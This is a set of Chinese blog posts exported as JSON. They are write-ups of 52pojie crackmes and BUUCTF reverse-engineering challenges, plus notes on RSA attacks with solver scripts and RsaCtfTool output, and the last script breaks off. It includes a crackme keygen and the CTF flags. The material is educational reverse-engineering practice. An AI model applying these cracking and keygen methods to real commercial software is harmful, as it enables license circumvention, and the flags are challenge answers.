[{"title":"吾爱破解2022春节——Android中级题","url":"/posts/8b4ac9a8.html","content":"\n不会有人因为这道题所以去学了Android逆向吧？！！是的是我本人，为了能更好看懂Android程序还在寒假学了Java。所以这道题这么久才能跟你们见面。\n\n<!--more-->\n\n在AK看到apk有lib文件，说明调用了so文件。是arm64-v8a架构的。完蛋了AS模拟器也运行不了arm64-v8a架构的。\n\n{% asset_img 1.png jeb简单分析 %}\n\n先不管了，拖进IDA64看看情况。Native函数有两种定义方法，一种是按照类名函数名静态声明并导出，一种是在`JNI_OnLoad`里调用`vm -> GetEnv -> RegisterNatives`动态声明。看一眼它的导出表，发现并没有导出`checkSn`函数，那么就说明是`JNI_OnLoad`里动态注册的。\n\n那...接下来就动态调试啦，要真机调试啊救命！","categories":["Android逆向"],"tags":["IDA","Android Killer"]},{"title":"吾爱破解2022春节——Windows中级题","url":"/posts/5ada4708.html","content":"\n拿到程序的第一时间运行一下，熟悉一下程序的流程。这个程序的流程是要我们输入UID和key。用PE工具查一下壳，发现有UPX壳，用ESP定律即可脱壳。验证程序是否脱壳成功，可载入OD看是否能查询到字符串，或载入IDA查看是否有函数或是否可以反编译出伪代码。脱壳后还要保证程序与未脱壳程序执行的流程要一致。\n\n<!--more-->\n\n# IDA静态分析\n\n```c++\n...\n  SetConsoleTitleA(\"【2022春节】解题领红包之三\");\n  sub_403930((int)dword_41DDD0, \"Input your UID: \");\n  sub_402800(&v27);\n  if ( v27 > 2000000 )                          // v27 == UID,不能大于2000000\n  {\n    v3 = sub_403930((int)dword_41DDD0, \"Invalid UID, please input again.\");\n    sub_402660(10);\n    v4 = 0;\n    ...\n  }\n  sub_403930((int)dword_41DDD0, \"Input your Key: \");\n  sub_403BC0(&dword_41DE60, &v29);              // v29 == key\n  v8 = sub_401100(v27);                         // v8 = UID % 25\n  v9 = sub_401080(v27);                         // v9 = map[UID % 12]\n  v25 = sub_401110(v9);                         // 与v9有关，即与map[UID % 12]有关\n  v24 = v8;                                     // v24 = v8 = UID % 25\n  v28 = &v20;\n  sub_402460((int)&v20, (int)&v29);             // v20 = v29 = key\n  if ( sub_401520(v20, v21, v22, v23, v24, v25) == 1 )// 与key, UID % 12和UID % 25有关，关键函数\n  {\n    v10 = sub_403930((int)dword_41DDD0, \"Success\");\n    sub_402660(10);\n    v11 = 0;\n    ...\n  }\n...\n```\n\n```c++\nint __cdecl sub_401100(signed int a1)\n{\n  return a1 % 25;\n}\n```\n\n```c++\nint __cdecl sub_401080(signed int a1)\n{\n  int v2; // [sp+0h] [bp-30h]@1\n  int v3; // [sp+4h] [bp-2Ch]@1\n  int v4; // [sp+8h] [bp-28h]@1\n  int v5; // [sp+Ch] [bp-24h]@1\n  int v6; // [sp+10h] [bp-20h]@1\n  int v7; // [sp+14h] [bp-1Ch]@1\n  int v8; // [sp+18h] [bp-18h]@1\n  int v9; // [sp+1Ch] [bp-14h]@1\n  int v10; // [sp+20h] [bp-10h]@1\n  int v11; // [sp+24h] [bp-Ch]@1\n  int v12; // [sp+28h] [bp-8h]@1\n  int v13; // [sp+2Ch] [bp-4h]@1\n\n  v2 = 1;\n  v3 = 3;\n  v4 = 5;\n  v5 = 7;\n  v6 = 9;\n  v7 = 11;\n  v8 = 15;\n  v9 = 17;\n  v10 = 19;\n  v11 = 21;\n  v12 = 23;\n  v13 = 25;\n  return *(&v2 + a1 % 12);\n}\n```\n\n```c++\nchar __cdecl sub_401520(char a1, int a2, int a3, int a4, signed int a5, int a6)\n{\n  ...\n  v19 = v18;\n  std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(0);\n  sub_4034E0(\"flag\", strlen(\"flag\"));   // flag初始化\n  v23 = v18;\n  std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(0);\n  sub_4034E0(&dword_41A0F8, strlen((const char *)&dword_41A0F8));\n  ...\n  sub_402BE0(&dword_41A0B0, strlen((const char *)&dword_41A0B0));// flag初始化后：v19[]=flag{Happy_New_Year_52Pojie_2022}\n  v17 = a5;                                     // v17 = UID % 25\n  v16 = a6;                                     // v16 = map[UID % 12]\n  v51 = &v12;\n  sub_402460((int)&v12, (int)&a1);              // v12 = a1 = key\n  sub_4011B0((int)&v50, v12, v13, v14, v15, v16, v17);// 这个关键函数的返回值存到v50[],也就是说我们输入的key要经过转换才能变成v19[]\n  LOBYTE(v52) = 29;\n  v8 = sub_403ED0((int)&v50, (int)&v19);        // v8 == 0，字符串比较函数,比较v19[]与v50[]\n  LOBYTE(v52) = 28;\n  v17 = 1;\n  if ( v8 )                                     // v8 == 0\n  {\n      ...\n          return = 0;\t\t\t\t\t\t\t// 返回0是错的，可以不看\n  }\n  else\n  {\n    std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(v17);\n    LOBYTE(v52) = 27;\n    std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(1);\n    LOBYTE(v52) = 26;\n    ...\n std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(1);\n    LOBYTE(v52) = 0;\n    std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(1);\n    v52 = -1;\n    std::basic_string<char,std::char_traits<char>,std::allocator<char>>::_Tidy(1);\n    result = 1;\n  }\n  return result;\n}\n```\n\n由于`sub_4011B0`里面的算法看伪代码太过复杂，想直观看到key变换成什么，可以用OllyDbg动态调试，直接看比较函数`sub_403ED0`出来的与原key比较。\n\n# OD动态调试\n\n程序说的UID其实是吾爱论坛的UID，我看大牛们wp时百度了好久UID在哪里查看...\n\n载入OD，输入自己的UID和随便的key，比如hhhhhhhhhhhh。输入完后去到`sub_401520`进去，再去到`sub_403ED0`下断运行至此处。\n\n```asm\n00401CB2    E8 F9F4FFFF     call dumped_.004011B0\n00401CB7    83C4 1C         add esp,0x1C\t\t\t\t\t;403ED0参数从这里开始\n00401CBA    8D4C24 10       lea ecx,dword ptr ss:[esp+0x10]\n00401CBE    C68424 EC010000>mov byte ptr ss:[esp+0x1EC],0x1D\n00401CC6    51              push ecx\t\t\t\t\t\t;第二个参数入栈v19[]=flag{Happy_New_Year_52Pojie_2022}的首地址\n00401CC7    8D8C24 D4010000 lea ecx,dword ptr ss:[esp+0x1D4];第一个参数的首地址在ecx中(v50[])\n00401CCE    E8 FD210000     call dumped_.00403ED0\n```\n\n为了验证入栈的是否是v19，可查看堆栈窗口。\n\n```asm\n0012FD44   0012FD58\t;首地址为0012FD58\n0012FD48   006B5B28\n0012FD4C   00000017\n0012FD50   0012FFC0\n0012FD54   FFFFFFFF\n0012FD58   003200FF\t;但这个并不是v19,再下一个地址才是\n0012FD5C   00392009  ASCII \"flag{Happy_New_Year_52Pojie_2022}\"\n```\n\n再找ecx->数据窗口中跟随，同理，第二个地址存放的是比较的数据。\n\n```asm\n0012FF18  00 00 00 00 99 20 39 00 0C 00 00 00 1F 00 00 00  ....?9.....\u001f...\n```\n\n继续数据窗口跟随，我们输入的“h”已经全变为“q”了。说明很有可能是单表替换中的移位密码，位数为9。\n\n```asm\n00392099  71 71 71 71 71 71 71 71 71 71 71 71 00 00 00 00  qqqqqqqqqqqq....\n```\n\n再试多几次验证一下，发现不是移位密码！\n\nhappynewyear->qxiizktbztxg，只是普通的单表替换。\n\n| a    | b    | c    | d    | e    | f    | g    | h    | i    | j    | k    | l    | m    | n    | o    | p    | q    | r    | s    | t    |\n| ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |\n| x    | w    | v    | u    | t    | s    | r    | q    | p    | o    | n    | m    | l    | k    | j    | i    | h    | g    | f    | e    |\n\n| u    | v    | w    | x    | y    | z    | A    | B    | C    | D    | E    | F    | G    | H    | I    | J    | K    | L    | M    | N    |\n| ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |\n| d    | c    | b    | a    | z    | y    | X    | W    | V    | U    | T    | S    | R    | Q    | P    | O    | N    | M    | L    | K    |\n\n| O    | P    | Q    | R    | S    | T    | U    | V    | W    | X    | Y    | Z    | 0    | 1    | 2    | 3    | 4    | {    | _    | ...  |\n| ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |\n| J    | I    | H    | G    | F    | E    | D    | C    | B    | A    | Z    | Y    | 0    | 1    | 2    | 3    | 4    | {    | _    | ...  |\n\n所以`flag{Happy_New_Year_52Pojie_2022}`逆过来就是`smxr{Qxiiz_Ktb_Ztxg_52Ijopt_2022}`\n\n{% asset_img 成功截图.png 成功 %}\n\n注意，这个只是在我UID为1787123的情况下的替换表，UID不同替换表也不同。我看wp说这其实是仿射密码，也就是替换表与静态分析`map[UID % 12]`，`UID % 25`其实是有关系的。\n\n会的还是太少了，仿射密码的加解密原理自行百度，这里不想写了，最后附上大牛的注册机：\n\n```c\n#include <stdio.h>\n#include <string.h>\nchar const flag[] = \"flag{Happy_New_Year_52Pojie_2022}\";\nint map[] = {1, 3, 5, 7, 9, 11, 15, 17, 19, 21, 23, 25};\nint main()\n{\n    int uid;\n    while (scanf(\"%d\", &uid) != EOF)\n    {\n        int A = map[uid % 12];\n        int B = uid % 25;\n        char buf[sizeof(flag)];\n        strcpy(buf, flag);\n        char *p = buf;\n        while (*p)\n        {\n            if ('a' <= *p && *p <= 'z')\n            {\n                *p = ((*p - 'a') * A + B) % 26 + 'a';\n            }\n            else if ('A' <= *p && *p <= 'Z')\n            {\n                *p = ((*p - 'A') * A + B) % 26 + 'A';\n            }\n            ++p;\n        }\n        printf(\"%s\\n\", buf);\n    }\n    return 0;\n}\n```\n\n","categories":["Windows逆向"],"tags":["OllyDbg","IDA"]},{"title":"RSA算法","url":"/posts/855b12c4.html","content":"\n我是悟出一个道理了，搞安全的逃不过各种密码算法，密码学一定要给我捡起来！！本来想在这里上传我的密码学笔记的，但是图片太多不想搞，放在CSDN博客也有一些兼容性问题。\n\n<!--more-->\n\n# 1. 算法描述\n\n（此处暴力摘抄百度百科）\n\nRSA算法的具体描述如下： \n（1）任意选取两个不同的大素数p和q计算乘积\n$$\nn=pq,\\ \\phi(n)=(p-1)(q-1)\n$$\n（2）任意选取一个大整数e，满足$\\gcd(e,\\phi(n))=1$ ，整数e用做加密钥（注意：e的选取是很容易的，例如，所有大于p和q的素数都可用，通常取65537）；\n\n（3）确定的解密钥d，满足$ed\\mod \\phi(n)=1$，即$ed=k\\phi(n)+1,k\\ge1$是一个任意的整数；所以，若知道e和$\\phi(n)$，则很容易计算出d；\n\n（4）公开整数n和e，秘密保存d；\n\n（5）将明文m（m<n是一个整数）加密成密文c，加密算法为\n$$\nc = Enc(m)=m^e\\mod n\n$$\n（6）将密文c解密为明文m，解密算法为\n$$\nm = Dec(c) = c^d\\mod n\n$$\n然而只根据n和e（注意：不是p和q）要计算出d是不可能的。因此，任何人都可对明文进行加密，但只有授权用户（知道d）才可对密文解密。总之，RSA总离不开n、e、d、p、q五个数。(n,e)组成公钥，d为私钥。\n\n五个数之间的关系：\n\np和q：大整数n的两个因子（factor）\nn：大整数n，我们称之为模数（modulus）\ne和d：互为模反数的两个指数（exponent）\n\n# 2. 算法攻击\n\n## 2.1 模数分解\n\n解决RSA题目最简单，最暴力，最好使的方法就是分解模数n。如果能够将n分解，成功得到p，q的取值，那么可求$\\phi(n)$。\n\n那么如何分解模数呢？这里有几种方法。\n\n### 2.1.1 直接分解\n\n利用 http://factordb.com/ 直接分解模数n，但这种方法只适用于n比较小的情况(512bit-768bit以内，即长度为64-96之间)，其实也有特殊情况，我就成功分解过一个长度为511的大整数。\n\n### 2.1.2 利用公约数\n\n如果在两次公钥的加密过程中使用的$n_1$ 和$n_2$具有相同的e，那么可以利用欧几里得算法直接将$n_1$和$n_2$分解。\n\n通过欧几里得算法可以直接求出$n_1$和$n_2$的最大公约数p：$(n_1,n_2)=p$\n\n可以得出：$n_1=pq_1$，$n_2=pq_2$\n\n```python\ndef gcd(a, b):\n   if a < b:\n     a, b = b, a\n   while b != 0:\n     temp = a % b\n     a = b\n     b = temp\n   return a\n\nif __name__ == '__main__':\n    n1 = input(\"n1:\")\n    n2 = input(\"n2:\")\n    p = gcd(n1, n2)\n    print (p)\n    q1 = n1 // p\n    print (q1)\n```\n\n### 2.1.3 yafu分解\n\n在p，q的取值差异过大，或者p，q的取值过于相近的时候，Format方法与Pollard rho方法都可以很快将n分解成功。\n\n此类分解方法有一个开源项目yafu将其自动化实现了，不论n的大小，只要p和q存在相差过大或者过近时，都可以通过yafu很快地分解成功。(我怎么知道p、q相差大不大，相不相近，反正如果上面两种方法都不行，就可以试试这种方法)\n\n```\n用法：factor(n)\n```\n\n```\nD:\\CTF\\tools\\yafu-1.34>yafu-x64.exe\nfactor(23333333333333)\n\n\nfac: factoring 23333333333333\nfac: using pretesting plan: normal\nfac: no tune info: using qs/gnfs crossover of 95 digits\ndiv: primes less than 10000\nfmt: 1000000 iterations\nTotal factoring time = 0.0050 seconds\n\n\n***factors found***\n\nP2 = 31\nP12 = 752688172043\n\nans = 1\n```\n\n### 2.1.4 成功分解模数后\n\n成功求出p、q的值后就可以用脚本进行解密求得私钥d了。\n\n```python\nimport gmpy2\nn = 103461035900816914121390101299049044413950405173712170434161686539878160984549\np = 282164587459512124844245113950593348271\nq = 366669102002966856876605669837014229419\ne = 65537\n\nd = gmpy2.invert(e,(p-1)*(q-1))\nprint (\"d = \" + str(d))\n#d为私钥\nc = 0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35\nm = gmpy2.powmod(c,d,n)\nprint(\"m = \" + str(m))\n'''\nd = 91646299298871237857836940212608056141193465208586711901499120163393577626813\nm = 185534734614696481020381637136165435809958101675798337848243069\n'''\n```\n\n## 2.2 低加密指数分解\n\n当e=3时，如果明文过小，导致明文的三次方仍然小于n，那么通过直接对密文三次开方，即可得到明文。\n\n在$m^e=k*n+c$中m是要求的，e，n，c已知，需要爆破n。在开e次方得到整数的时候这时候的k和m是需要的值。\n\n```python\n#!/usr/bin/python\n# coding=utf-8\nimport gmpy\nfrom Crypto.PublicKey import RSA\n\n\ndef calc(j):\n\n    a, b = gmpy.root(cipher + j * N, 3)\n    if b > 0:\n        m = a\n        print '{:x}'.format(int(m)).decode('hex')\n        # pool.terminate()\n\n# 读入公钥\nwith open('pubkey.pem', 'r') as f:\n    key = RSA.importKey(f)\n    N = key.n\n    e = key.e\n\n# 读入密文\nwith open('flag.enc', 'r') as f:\n    cipher = f.read().encode('hex')\n    cipher = int(cipher, 16)\n\n# 暴力破解\ninputs = range(0, 118720000)\nresult = []\nmap(calc, inputs)\nprint len(result)\n```\n\n除了低加密指数攻击，还有低解密指数攻击，也就是密钥d比较小的情况，密钥d小意味着e很大，所以e很大的可以用低解密指数攻击。\n\n低解密指数攻击工具：https://github.com/pablocelayes/rsa-wiener-attack\n\n将整个文件打包解压放在主机，这里要将破解脚本放在rsa-wiener-attack目录下，否则导入包时会发生错误。\n\n```python\n#python2\nimport hashlib\nimport RSAwienerHacker\nN = 101991809777553253470276751399264740131157682329252673501792154507006158434432009141995367241962525705950046253400188884658262496534706438791515071885860897552736656899566915731297225817250639873643376310103992170646906557242832893914902053581087502512787303322747780420210884852166586717636559058152544979471\ne = 46731919563265721307105180410302518676676135509737992912625092976849075262192092549323082367518264378630543338219025744820916471913696072050291990620486581719410354385121760761374229374847695148230596005409978383369740305816082770283909611956355972181848077519920922059268376958811713365106925235218265173085\nd =  RSAwienerHacker.hack_RSA(e,N)\nprint(d)\nflag = \"flag{\" + hashlib.md5(hex(d)).hexdigest() + \"}\"\nprint(flag)\n#8920758995414587152829426558580025657357328745839747693739591820283538307445\n#flag{47bf28da384590448e0b0d23909a25a4}\n```\n\npython3环境下会报编码错误，是因为python3里hex(d)的结果和python2里hex(d)的结果相差了一个末尾的L，所以再计算md5的结果也就不一样，可以手动加上L再放到md5函数里面。\n\n```python\nprint(hashlib.md5(b'0x13b8f87d588e2aa4a27296cf2898f56ab4c8deb5a1222ec080e23afecaf7f975L').hexdigest())\n```\n\n## 2.3 共模攻击\n\n如果在RSA加密中使用了不同的e而使用了相同的n对相同的明文m进行加密，那么就可以在不分解n的情况下还原出明文m的值，其中$e_1$和$e_2$互素。\n$$\nc_1=m^{e_1}\\mod n\n$$\n$$\nc_2=m^{e_2}\\mod n\n$$\n\n证明：\n\n因为$\\gcd(e_1,e_2)=1$，即存在$s_1,s_2$使得：\n$$\ns_1*e_1+s_2*e_2=1\n$$\n又因为：\n$$\nc_1= m^{e_1}\\mod n\n$$\n$$\n c_2= m^{e_2} \\mod n\n$$\n\n通过代入化简可以得出：\n$$\nc_1^{s_1}*c_2^{s_2}= m \\mod n\n$$\n\n```python\n#coding=utf-8\n#python2\nimport gmpy2\nfrom libnum import n2s,s2n\nn = 0x00b0bee5e3e9e5a7e8d00b493355c618fc8c7d7d03b82e409951c182f398dee3104580e7ba70d383ae5311475656e8a964d380cb157f48c951adfa65db0b122ca40e42fa709189b719a4f0d746e2f6069baf11cebd650f14b93c977352fd13b1eea6d6e1da775502abff89d3a8b3615fd0db49b88a976bc20568489284e181f6f11e270891c8ef80017bad238e363039a458470f1749101bc29949d3a4f4038d463938851579c7525a69984f15b5667f34209b70eb261136947fa123e549dfff00601883afd936fe411e006e4e93d1a00b0fea541bbfc8c5186cb6220503a94b2413110d640c77ea54ba3220fc8f4cc6ce77151e29b3e06578c478bd1bebe04589ef9a197f6f806db8b3ecd826cad24f5324ccdec6e8fead2c2150068602c8dcdc59402ccac9424b790048ccdd9327068095efa010b7f196c74ba8c37b128f9e1411751633f78b7b9e56f71f77a1b4daad3fc54b5e7ef935d9a72fb176759765522b4bbc02e314d5c06b64d5054b7b096c601236e6ccf45b5e611c805d335dbab0c35d226cc208d8ce4736ba39a0354426fae006c7fe52d5267dcfb9c3884f51fddfdf4a9794bcfe0e1557113749e6c8ef421dba263aff68739ce00ed80fd0022ef92d3488f76deb62bdef7bea6026f22a1d25aa2a92d124414a8021fe0c174b9803e6bb5fad75e186a946a17280770f1243f4387446ccceb2222a965cc30b3929L\ne1 = 17\ne2 = 65537\nfo1 = open(\"flag.enc1\",'rb')\nfo2 = open(\"flag.enc2\",\"rb\")\n\ndatafo1 = fo1.read()\nmessage1 = s2n(datafo1)\nfo1.close()\ndatafo2 = fo2.read()\nmessage2 = s2n(datafo2)\n\ngcd,s,t = gmpy2.gcdext(e1,e2)\nprint (message1)\nprint (gcd,s,t)\n\n\n#s和t一定有一个位负数，若s<0,求a^s <=> (1/a)^(-s)\n\nplain = gmpy2.powmod(message1, s, n) * gmpy2.powmod(message2, t, n) % n\n\nprint (plain)\n\nprint (n2s(plain))\n\n#gcdext(...) gcdext(a, b) returns a 3-element tuple (g, s, t) such that\n#g == gcd(a, b) and g == a * s + b * t\n\n\n#invert(...) invert(x, m) returns y such that x * y == 1 modulo m, or 0 if no such y exists.\n```\n\n\n\n\n\n","categories":["算法"],"tags":["Python"]},{"title":"BUUCTF 逆向合集","url":"/posts/f4e89fa4.html","content":"\n前面很容易就解出来的题我就没放上来，都已经做过这么多题了，相信对你们来说也是so easy。\n\n<!--more-->\n\n# 1. SimpleRev\n\n可能做题做多了脑子抽了，这道题其实很容易结果我好久都没解出来。好吧，那你就是第1题啦。\n\nELF文件，载入IDA。\n\n{% asset_img 1.1.png IDA分析 %}\n\n{% asset_img 1.2.png IDA分析 %}\n\n但长长整型转换的字符串是小端存储的，所以还要逆序！！这个超级容易错，我出来的flag不对就是因为这个！！\n\n{% asset_img 1.3.png IDA分析 %}\n\n由于逆向v1有点困难，所以我们就不逆向算法了，直接将ASCII码表里所有字符按照原本算法进行匹配。\n\n```python\ntext = list(\"killshadow\")\nkey = list(\"ADSFKNDCLS\")\nans = \"\"\nv5 = len(key)\nv3 = 0\nfor i in range(v5):\n    if key[v3%v5]>'@' and key[v3%v5]<='Z':\n        key[i] = chr(ord(key[v3%v5]) + 32)\n        v3 += 1\n        print(key[i],end=\"\")\nprint()\nfor i in range(v5):\n    for j in range(32,128):\n        if (j>64 and j<91) or (j>96 and j<123):\n            if (j-39-ord(key[v3%v5])+97)%26+97 == ord(text[i]):\n                v3 += 1\n                ans += chr(j)\n                break\nprint(ans)\n'''\nadsfkndcls\nKLDQCUDFZO\n'''\n```\n\n```\nflag{KLDQCUDFZO}\n```\n\n# 2. luck_guy\n\n无壳，64位ELF，载入IDA分析一下。随着main函数进入关键函数。\n\n{% asset_img 2.1.png IDA分析 %}\n\n```python\n# 将f2串加上0x，再放入列表\ntmp_list = []\nindex = 0\nwhile index < 15:\n\ttmp = eval('0x' + f2[index:index+2])\n\ttmp_list.append(tmp)\n\tindex += 2\n\nfor i in range(len(tmp_list)):\n\tif i % 2 == 1:\n\t\ttmp_list[i] = tmp_list[i] - 2\n\telse:\n\t\ttmp_list[i] = tmp_list[i] - 1\n\tans += chr(tmp_list[i])\nprint(ans)\n'''\nGXY{do_not_hate_me}\n'''\n```\n\n```\nflag{do_not_hate_me}\n```\n\n# 3. 刮开有奖\n\n{% asset_img 3.1.png IDA分析 %}\n\nv4解出来是`jMp`，v5解出来是`WP1`。\n\n```\nString[2] = 'W'\nString[3] = 'P'\nString[4] = '1'\nString[5] = 'j'\nString[6] = 'M'\nString[7] = 'p'\n```\n\n接下来算String[0]和String[1]，发现如果直接代入上面的值，却得String[0]=`|`，String[1]=`C`，String[2]=`a`，String[3]=`@`。所以v7~v16应该是做了某些变换。sub_4010F0就是做变换的函数。\n\n{% asset_img 3.2.png IDA分析 %}\n\n进去看它代码，有do...while...语句和递归，由于我用Python一直出错，可能是我逻辑出现了问题，所以最后还是用C照搬它的代码吧。\n\n```c\n#include <stdio.h>\nint sub_4010F0(char * a1, int a2, int a3)\n{\n    int result; // eax\n    int i; // esi\n    int v5; // ecx\n    int v6; // edx\n\n    result = a3;\n    for (i = a2; i <= a3; a2 = i)\n    {\n        v5 = i;\n        v6 = a1[i];\n        if (a2 < result && i < result)\n        {\n            do\n            {\n                if (v6 > a1[result])\n                {\n                    if (i >= result)\n                        break;\n                    ++i;\n                    a1[v5] = a1[result];\n                    if (i >= result)\n                        break;\n                    while (a1[i] <= v6)\n                    {\n                        if (++i >= result)\n                            goto LABEL_13;\n                    }\n                    if (i >= result)\n                        break;\n                    v5 = i;\n                    a1[result] = a1[i];\n                }\n                --result;\n            } while (i < result);\n        }\n    LABEL_13:\n        a1[result] = v6;\n        sub_4010F0(a1, a2, i - 1);\n        result = a3;\n        ++i;\n    }\n    return result;\n}\n\nint main()\n{\n    char a1[12] = { 90,74,83,69,67,97,78,72,51,110,103 };\n    printf(\"%s\\n\", a1);\n    sub_4010F0(a1, 0, 10);\n    printf(\"%s\", a1);\n}\n/**\nZJSECaNH3ng\n3CEHJNSZagn\n*/\n```\n\n呜呜呜不得不说，C真香啊，弄了我好久的Python，C一下就出来了，气人！\n\n```\nString[0] = '3' + 34 = 'U'\nString[1] = 'J'\nString[2] = 'W'\nString[3] = 'P'\n```\n\n验证一下，String[2]和String[3]与上面Base64解密解出来的是一致的，所以是正确答案。\n\n```\nflag{UJWP1jMp}\n```\n\n# 4. pyre\n\n下载下来是`.pyc`文件，这个是 Python 程序编译后得到的字节码文件，找一个[python反编译的网站](https://tool.lu/pyc/)即可转化为python代码。\n\n```python\n#!/usr/bin/env python\n# visit https://tool.lu/pyc/ for more information\nprint 'Welcome to Re World!'\nprint 'Your input1 is your flag~'\nl = len(input1)\nfor i in range(l):\n    num = ((input1[i] + i) % 128 + 128) % 128\n    code += num\n\nfor i in range(l - 1):\n    code[i] = code[i] ^ code[i + 1]\n\nprint code\ncode = [\n    '\\x1f',\n    '\\x12',\n    '\\x1d',\n    '(',\n    '0',\n    '4',\n    '\\x01',\n    '\\x06',\n    '\\x14',\n    '4',\n    ',',\n    '\\x1b',\n    'U',\n    '?',\n    'o',\n    '6',\n    '*',\n    ':',\n    '\\x01',\n    'D',\n    ';',\n    '%',\n    '\\x13']\n```\n\n我们要做的工作就是将它逆向回去。\n\n```python\nimport string\ncode = [\n    '\\x1f',\n    '\\x12',\n    '\\x1d',\n    '(',\n    '0',\n    '4',\n    '\\x01',\n    '\\x06',\n    '\\x14',\n    '4',\n    ',',\n    '\\x1b',\n    'U',\n    '?',\n    'o',\n    '6',\n    '*',\n    ':',\n    '\\x01',\n    'D',\n    ';',\n    '%',\n    '\\x13']\nl = len(code)\nfor i in range(l-2,0,-1):\n    code[i] = chr(ord(code[i]) ^ ord(code[i + 1]))\ninput = string.printable\nans = \"\"\nfor i in range(l):\n    for j in input:\n        if code[i] == chr(((ord(j) + i) % 128 + 128) % 128):\n            ans += j\nprint (ans)\n'''\nWHT{Just_Re_1s_Ha66y!}\n'''\n```\n\n```\nflag{Just_Re_1s_Ha66y!}\n```\n\n# 5. rsa\n\n一道像密码题的逆向题。解压出来有两个文件，一个公钥文件和一个加密文件。\n\n{% asset_img 5.1.png 文件 %}\n\n[rsa第一种解法](https://blog.csdn.net/m0_57291352/article/details/117716772)，通过解析公钥获得n和e，再将n分解成p和q，然后用Python中的rsa和gmpy2库解密。\n\nrsa第二种解法，用RsaCtfTool直接解。[kali安装RsaCtfTool](https://blog.csdn.net/Rational_HYJ/article/details/105688728)，安装好后进入其目录在终端输入命令：`python3 RsaCtfTool.py --publickey pub.key --uncipherfile flag.enc`\n\n```\n┌──(v5le0n9㉿kali)-[~/RsaCtfTool]\n└─$ python3 RsaCtfTool.py --publickey pub.key --uncipherfile flag.enc    1 ⨯\nprivate argument is not set, the private key will not be displayed, even if recovered.                                                                    \n\n[*] Testing key pub.key.\n[*] Performing system_primes_gcd attack on pub.key.\n100%|███████████████████████████████| 7007/7007 [00:00<00:00, 1370394.86it/s]\n[*] Performing fibonacci_gcd attack on pub.key.\n100%|████████████████████████████████| 9999/9999 [00:00<00:00, 302473.41it/s]\n[*] Performing pastctfprimes attack on pub.key.\n100%|█████████████████████████████████| 113/113 [00:00<00:00, 2246238.64it/s]\n[*] Performing smallq attack on pub.key.\n[*] Performing factordb attack on pub.key.\n[*] Attack success with factordb method !\n\nResults for pub.key:\n\nUnciphered data :\nHEX : 0x00029d207b7a521e08e4e6180600666c61677b646563727970745f3235367d0a\nINT (big endian) : 4618144028027957675862906963888332345633248954043303780331531906089123082\nINT (little endian) : 4744358497414744401850218354568232353073084770228403473305939615805528146432\nutf-16 : Ȁ₝穻Ṓᣦ汦条摻捥祲瑰㉟㘵੽\nSTR : b'\\x00\\x02\\x9d {zR\\x1e\\x08\\xe4\\xe6\\x18\\x06\\x00flag{decrypt_256}\\n'\n```\n\n```\nflag{decrypt_256}\n```\n\n# 6. CrackRTF\n\n{% asset_img 6.1.png IDA分析 %}\n\n{% asset_img 6.2.png IDA分析 %}\n\n查看一下`CryptCreateHash`函数原型：\n\n```c\nBOOL CRYPTFUNC CryptCreateHash( \n  HCRYPTPROV hProv,\t\t//句柄\n  ALG_ID Algid, \t\t//算法id\n  HCRYPTKEY hKey, \t\t//必须为0\n  DWORD dwFlags, \t\t//标志值\n  HCRYPTHASH* phHash\t//存储哈希值的地址\n);\n```\n\nAlgid在这里查：https://docs.microsoft.com/en-us/windows/win32/seccrypto/alg-id ，发现0x8004是SHA1加密算法。\n\n{% asset_img 6.3.png SHA加密算法 %}\n\n此时可以通过Python的hashlib包对前6位进行爆破。\n\n```python\nimport hashlib\nflag2 = \"@DBApp\"\n# 字符串转换为整型大于100000，长度为6，所以最大为999999\n# atoi只有字符串全为数字才能转换\nfor i in range(100000,999999):\n    h2 = hashlib.sha1((str(i)+flag2).encode())\n    flags = h2.hexdigest()\n    # hashlib解密后是小写，所以要转换为小写\n    if \"6E32D0943418C2C33385BC35A1470250DD8923A9\".lower() == flags:\n            print (str(i)+flag2)\n'''\n123321@DBApp\n'''\n```\n\n所以前6位为`123321`。继续分析密码2。\n\n{% asset_img 6.4.png IDA分析 %}\n\n进入401019，又是加密函数，0x8003是MD5加密。但这时不能用上面方法解决了，因为它的范围太大了，不只是数字组合还有字母组合还有数字字母组合，所以爆破这方法不可行。\n\n我们看到还调用了一个40100F的函数，可以进去看看。\n\n{% asset_img 6.5.png IDA分析 %}\n\n{% asset_img 6.6.png IDA分析 %}\n\n既然需要知道资源数据，我们在[吾爱破解培训第三课](https://v5le0n9.github.io/posts/7cd35487.html?#4-%E4%BF%AE%E6%94%B9%E7%89%88%E6%9D%83%E5%92%8C%E8%B5%84%E6%BA%90)里就用过很多查看或修改资源的工具，比如：Restorator、ResEdit、ResourceHacker等。\n\n我们用ResourceHacker打开exe文件，找到AAA类型的资源数据。\n\n{% asset_img 6.7.png 资源数据 %}\n\n整个字符串一共18位，但后12位我们已经知道了，所以只要异或前6位即可。资源数据前6位为`05 7D 41 15 26 01`。而rtf文件的前6位是什么呢？我们已经知道CreateFileA新建一个0字节的文件，也就是说rtf的文件头也是我们写入的，而头文件是文件最开始的数据，所以我们需要rtf文件头的前6位。\n\n创建一个`.rtf`文件，在里面写点东西。拖进WinHex查看文件头。(不写直接拖进WinHex为空，任何文件任何格式创建了不写都是如此)\n\n{% asset_img 6.8.png rtf文件格式 %}\n\n那么现在可以编写逆向脚本了：\n\n```python\nrtf = [0x7b,0x5c,0x72,0x74,0x66,0x31]\nres = [0x05,0x7d,0x41,0x15,0x26,0x01]\nans = \"\"\nfor i in range(len(rtf)):\n    ans += chr(rtf[i] ^ 